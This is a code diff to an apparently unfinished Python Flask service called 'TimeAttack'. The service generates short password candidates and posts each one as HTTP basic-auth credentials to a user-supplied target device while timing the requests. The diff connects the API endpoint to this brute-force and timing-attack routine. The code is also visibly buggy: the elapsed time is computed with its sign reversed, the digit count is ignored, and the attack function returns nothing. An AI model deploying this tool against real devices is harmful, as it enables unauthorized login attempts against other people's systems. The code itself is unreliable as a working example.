@@ -16,20 +16,6 @@ from itertools import product
 
 chars = digits + ascii_uppercase + ascii_lowercase
 
-"""
-def make_celery(app):
-    celery = Celery(app.import_name, backend=app.config['CELERY_RESULT_BACKEND'],
-                    broker=app.config['CELERY_BROKER_URL'])
-    celery.conf.update(app.config)
-    TaskBase = celery.Task
-    class ContextTask(TaskBase):
-        abstract = True
-        def __call__(self, *args, **kwargs):
-            with app.app_context():
-                return TaskBase.__call__(self, *args, **kwargs)
-    celery.Task = ContextTask
-    return celery
-"""
 
 def password_generator(digits):
     for n in range(1, 4 + 1):
@@ -37,17 +23,18 @@ def password_generator(digits):
             yield(''.join(comb))
 
 
-def primary_attack(address, digits, resultname):
+def primary_attack(address, digits, username):
     """ address = address of the target device
         digits = how many digits in the password
         username = what username to use in the attack
     """
+    elapsed_time = 0
     passwords = password_generator(digits)
     for password in passwords:
         start = time.perf_counter()
         req = requests.post(address, auth=(username, password))
-
-
+        end = time.perf_counter()
+        elapsed_time = start - end
 
 
 def create_app():
@@ -60,9 +47,9 @@ def create_app():
     ns = api.namespace('TimeAttack', description='Timing attack operations')
 
     params = api.model('Params', {
-        'address': fields.Integer(readOnly=True, description='Attack target address'),
+        'address': fields.String(required=True, description='Attack target address'),
         'digits': fields.Integer(required=True, description='Number of digits in the password to be brute forced'),
-        'username': fields.Integer(required=True, description='Username to attack')
+        'username': fields.String(required=True, description='Username to attack')
     })
 
 
@@ -73,8 +60,14 @@ def create_app():
         @ns.expect(params)
         @ns.marshal_with(params)
         def post(self):
-            primary_attack(address, digits, username)
-            return
+            data = api.payload
+            print(data)
+            address = data['address']
+            digits = data['digits']
+            username = data['username']
+            resultname = primary_attack(address, digits, username)
+
+            return(resultname)
 
 
     @ns.route('/results')
